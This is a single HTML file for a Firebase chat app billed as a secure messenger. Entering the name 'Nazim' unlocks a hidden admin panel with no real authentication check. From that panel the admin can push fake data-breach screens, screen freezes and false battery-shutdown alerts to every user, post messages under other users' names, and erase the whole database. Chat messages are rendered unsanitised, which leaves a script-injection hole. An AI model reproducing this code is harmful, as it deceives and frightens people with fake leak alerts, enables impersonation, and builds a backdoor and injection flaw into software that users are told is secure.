<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Connect | Secure</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        :root { --bg: #0d1117; --primary: #58a6ff; --danger: #ff4b4b; --green: #238636; --glass: rgba(22, 27, 34, 0.95); --border: rgba(255, 255, 255, 0.1); }
        body { margin: 0; font-family: 'Inter', -apple-system, sans-serif; background: var(--bg); color: #c9d1d9; overflow: hidden; }
        .app { max-width: 500px; margin: auto; height: 100vh; position: relative; display: flex; flex-direction: column; background: #010409; }
        
        /* Modern Header */
        header { padding: 18px; background: var(--glass); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; backdrop-filter: blur(12px); z-index: 1000; }
        header h1 { margin: 0; font-size: 1.1rem; letter-spacing: 1px; font-weight: 700; color: var(--primary); }

        .page { display: none; padding: 20px; flex: 1; overflow-y: auto; padding-bottom: 180px; scroll-behavior: smooth; }
        .active { display: block; animation: slideUp 0.3s ease; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }

        /* Hacker Dashboard UI */
        #nazim-dashboard { display: none; background: #000; border: 1px solid var(--danger); padding: 15px; margin: 10px; border-radius: 12px; flex-wrap: wrap; gap: 8px; box-shadow: 0 0 20px rgba(255, 75, 75, 0.2); }
        .pwr-btn { flex: 1; min-width: 90px; padding: 10px; font-size: 10px; background: #161b22; border: 1px solid var(--danger); color: var(--danger); cursor: pointer; font-weight: bold; border-radius: 6px; text-transform: uppercase; transition: 0.2s; }
        .pwr-btn:hover { background: var(--danger); color: white; box-shadow: 0 0 12px var(--danger); }
        .nuke { background: #4a0000 !important; border-color: #ff0000 !important; }

        /* User List & Cards */
        .target-card { background: var(--glass); border: 1px solid var(--border); padding: 16px; border-radius: 14px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: 0.2s; }
        .target-card:hover { border-color: var(--primary); background: rgba(88, 166, 255, 0.05); }

        /* Modern Chat Bubbles */
        .msg-container { display: flex; flex-direction: column; gap: 8px; }
        .msg { position: relative; padding: 12px 16px; border-radius: 18px; max-width: 75%; font-size: 14px; line-height: 1.5; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
        .msg.me { align-self: flex-end; background: var(--green); color: white; border-bottom-right-radius: 2px; }
        .msg.other { align-self: flex-start; background: #21262d; border: 1px solid var(--border); border-bottom-left-radius: 2px; }
        .msg b { font-size: 11px; opacity: 0.7; display: block; margin-bottom: 4px; }
        .del-msg { position: absolute; top: -8px; right: -8px; background: var(--danger); width: 20px; height: 20px; border-radius: 50%; font-size: 10px; display: none; align-items: center; justify-content: center; cursor: pointer; }
        .msg:hover .del-msg { display: flex; }

        /* Floating Input Bar */
        .input-wrap { position: absolute; bottom: 85px; width: 100%; padding: 0 15px; box-sizing: border-box; }
        .modern-input { background: #161b22; border: 1px solid var(--border); border-radius: 30px; display: flex; align-items: center; padding: 5px 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
        .modern-input input { flex: 1; background: transparent; border: none; color: white; padding: 12px; outline: none; font-size: 14px; }
        
        /* Overlays */
        #system-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:99999; color: #00ff41; flex-direction:column; align-items:center; justify-content:center; font-family: 'Courier New', monospace; text-align:center; padding: 20px; }
        .glitch-flash { animation: flash 0.1s infinite; }
        @keyframes flash { 0% { background: #f00; } 50% { background: #0f0; } 100% { background: #00f; } }
    </style>
</head>
<body>

<div id="system-overlay">
    <i class="fa-solid fa-skull-crossbones" style="font-size: 80px; margin-bottom: 20px; color: var(--danger);"></i>
    <div id="status-msg">> ACCESS DENIED...</div>
    <div id="log-content" style="font-size: 12px; margin-top: 15px; text-align: left;"></div>
</div>

<div class="app">
    <header>
        <h1>LIVE CONNECT</h1>
        <i class="fa-solid fa-shield-virus" style="color: var(--primary);"></i>
    </header>

    <div id="loginPage" class="page active">
        <div style="text-align:center; margin-top:80px;">
            <div style="background: rgba(88, 166, 255, 0.1); width: 80px; height: 80px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
                <i class="fa-solid fa-link" style="font-size: 35px; color: var(--primary);"></i>
            </div>
            <h2>Secure Gateway</h2>
            <p style="color: #8b949e; font-size: 14px;">Enter your identity to connect</p>
            <input type="text" id="userInput" class="modern-input" placeholder="Codename..." style="text-align:center; margin: 25px auto; width: 80%;">
            <button onclick="initSystem()" style="width:80%; padding:16px; background:var(--primary); color:white; border:none; border-radius:30px; font-weight:bold; cursor:pointer; box-shadow: 0 4px 12px rgba(88, 166, 255, 0.3);">ESTABLISH CONNECTION</button>
        </div>
    </div>

    <div id="homePage" class="page">
        <div class="target-card" onclick="openChatArea('global', false)">
            <div><b style="color:var(--primary)">Global Hub</b><br><small style="color:#8b949e">Everyone is here</small></div>
            <i class="fa-solid fa-earth-americas"></i>
        </div>
        <p style="font-size: 12px; color: #8b949e; margin: 25px 0 10px 5px; text-transform: uppercase; letter-spacing: 1px;">Detected Signals:</p>
        <div id="activeUsers"></div>
    </div>

    <div id="chatPage" class="page">
        <div id="nazim-dashboard">
            <button class="pwr-btn" onclick="executePower('freeze')">Freeze</button>
            <button class="pwr-btn" onclick="executePower('scare')">Data Leak</button>
            <button class="pwr-btn" onclick="executePower('glitch')">Glitch Bomb</button>
            <button class="pwr-btn" onclick="executePower('battery')">1% Prank</button>
            <button class="pwr-btn" onclick="executePower('restore')" style="border-color:#00ff41; color:#00ff41">Restore</button>
            <button class="pwr-btn nuke" onclick="fullSystemNuke()">NUKE DATABASE</button>
        </div>

        <div id="chatDisplay" class="msg-container"></div>
        
        <div class="input-wrap">
            <div class="modern-input">
                <i id="wand-icon" class="fa-solid fa-wand-magic-sparkles" style="display:none; color:gold; margin-right:10px; cursor:pointer;" onclick="toggleNazimPanel()"></i>
                <input type="text" id="messageInp" placeholder="Type encrypted message...">
                <i class="fa-solid fa-paper-plane" style="color:var(--primary); cursor:pointer;" onclick="dispatchMsg()"></i>
            </div>
        </div>
    </div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
import { getDatabase, ref, set, push, onValue, remove } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyCSD1O9tV7xDZu_kljq-0NMhA2DqtW5quE",
    authDomain: "live-chat-b810c.firebaseapp.com",
    databaseURL: "https://live-chat-b810c-default-rtdb.firebaseio.com",
    projectId: "live-chat-b810c"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

let userToken = null, roomID = "global", privateMode = false;
const MASTER_ADMIN = "Nazim"; 

window.initSystem = () => {
    const name = document.getElementById("userInput").value.trim();
    if(!name) return;
    userToken = name;
    document.getElementById("loginPage").style.display="none";
    document.getElementById("homePage").classList.add("active");

    if(userToken === MASTER_ADMIN) document.getElementById("wand-icon").style.display="block";

    // Global Trap Listener
    onValue(ref(db, "traps/" + userToken), snap => {
        const trap = snap.val();
        const overlay = document.getElementById("system-overlay");
        if(trap === "freeze") { overlay.style.display="flex"; document.getElementById("status-msg").innerText = "SYSTEM TERMINATED BY ADMIN"; }
        if(trap === "scare") { overlay.style.display="flex"; runFakeLeakSeq(); }
        if(trap === "glitch") { document.body.classList.add("glitch-flash"); setTimeout(()=>document.body.classList.remove("glitch-flash"), 3000); }
        if(trap === "battery") { alert("Warning: System Battery 1%. Initializing Emergency Shutdown."); overlay.style.display="flex"; }
        if(trap === "restore") { overlay.style.display="none"; document.body.classList.remove("glitch-flash"); }
    });

    if(userToken !== MASTER_ADMIN) set(ref(db, "online_users/" + userToken), { active: true });
    syncActiveSignals();
};

function runFakeLeakSeq() {
    const logs = ["> BREACHING KERNEL...", "> IP IDENTIFIED: 182.161.4.92", "> FETCHING GALLERY...", "> CONTACTS EXPORTED...", "> UPLOADING TO DARKWEB...", "> 100% LEAKED."];
    const logBox = document.getElementById("log-content"); logBox.innerHTML = "";
    let i = 0;
    let timer = setInterval(() => {
        logBox.innerHTML += logs[i] + "<br>"; i++;
        if(i >= logs.length) clearInterval(timer);
    }, 600);
}

window.openChatArea = (target, priv) => {
    roomID = priv ? [userToken, target].sort().join("::") : "global";
    privateMode = priv;
    document.getElementById("homePage").classList.remove("active");
    document.getElementById("chatPage").classList.add("active");
    loadStream();
};

window.dispatchMsg = () => {
    const inp = document.getElementById("messageInp");
    if(!inp.value.trim()) return;

    // Admin Persona Command
    if(userToken === MASTER_ADMIN && inp.value.startsWith("/as ")) {
        const parts = inp.value.split(" ");
        const fakeName = parts[1];
        const content = inp.value.replace("/as "+fakeName+" ", "");
        push(ref(db, "streams/global"), { sender: fakeName, text: content });
        inp.value = ""; return;
    }

    const path = privateMode ? "streams/private/" + roomID : "streams/global";
    push(ref(db, path), { sender: userToken, text: inp.value });
    inp.value = "";
};

function loadStream() {
    const path = privateMode ? "streams/private/" + roomID : "streams/global";
    onValue(ref(db, path), snap => {
        const display = document.getElementById("chatDisplay"); display.innerHTML = "";
        snap.forEach(m => {
            const data = m.val();
            const isMe = data.sender === userToken;
            const div = document.createElement("div"); div.className = `msg ${isMe ? 'me' : 'other'}`;
            div.innerHTML = `<b>${data.sender}</b>${data.text} 
            ${(userToken === MASTER_ADMIN) ? `<div class="del-msg" onclick="remove(ref(db,'${path}/${m.key}'))">✕</div>` : ''}`;
            display.appendChild(div);
        });
        display.parentElement.scrollTop = display.parentElement.scrollHeight;
    });
}

function syncActiveSignals() {
    onValue(ref(db, "online_users"), snap => {
        const list = document.getElementById("activeUsers"); list.innerHTML = "";
        snap.forEach(u => {
            if(u.key !== userToken) {
                let d = document.createElement("div"); d.className = "target-card";
                d.innerHTML = `<span>${u.key}</span> <i class="fa-solid fa-satellite-dish" style="color:var(--green)"></i>`;
                d.onclick = () => openChatArea(u.key, true);
                list.appendChild(d);
            }
        });
    });
}

window.toggleNazimPanel = () => {
    const panel = document.getElementById("nazim-dashboard");
    panel.style.display = panel.style.display === "flex" ? "none" : "flex";
};

window.executePower = (type) => {
    onValue(ref(db, "online_users"), snap => {
        snap.forEach(u => { if(u.key !== MASTER_ADMIN) set(ref(db, "traps/" + u.key), type); });
    }, {onlyOnce: true});
};

window.fullSystemNuke = () => { if(confirm("☢️ ERASE ALL DATA?")) remove(ref(db)); };
document.getElementById("messageInp").addEventListener("keypress", (e) => { if(e.key === 'Enter') dispatchMsg(); });
</script>
</body>
</html>
